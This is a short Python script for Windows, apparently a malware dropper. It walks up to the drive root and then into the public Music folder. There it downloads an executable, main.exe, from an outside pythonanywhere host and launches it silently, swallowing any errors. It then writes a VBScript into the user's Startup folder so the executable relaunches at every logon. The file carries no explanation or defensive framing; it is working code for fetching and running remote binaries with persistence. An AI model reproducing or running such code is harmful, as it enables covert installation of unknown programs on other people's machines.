import requests,os,subprocess

def download(url):

    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)
    

current_dir = os.getcwd()
strr = os.getcwd()
x = -1
for i in os.getcwd():
    if i == "\\":
        x += 1
for i in range(x):
    os.chdir("..")

os.chdir("public")
os.chdir("Music")

try:
    download("https://armeng.pythonanywhere.com/media/files/main.exe")
    os.startfile("main.exe")
except Exception:
    pass

file_dir_r = os.getcwd()
file_dir = os.path.join(file_dir_r,"main.exe")

os.chdir(current_dir)
x = -2
for i in os.getcwd():
    if i == "\\":
        x += 1
for i in range(x):
    os.chdir("..")

print(os.getcwd())
os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
with open("startup.vbs","w+") as w:
    w.write('Set shell = CreateObject("WScript.Shell")\n')
    w.write('shell.CurrentDirectory = "'+file_dir_r+'"\n')
    w.write('shell.Run "main.exe"')
    w.close()
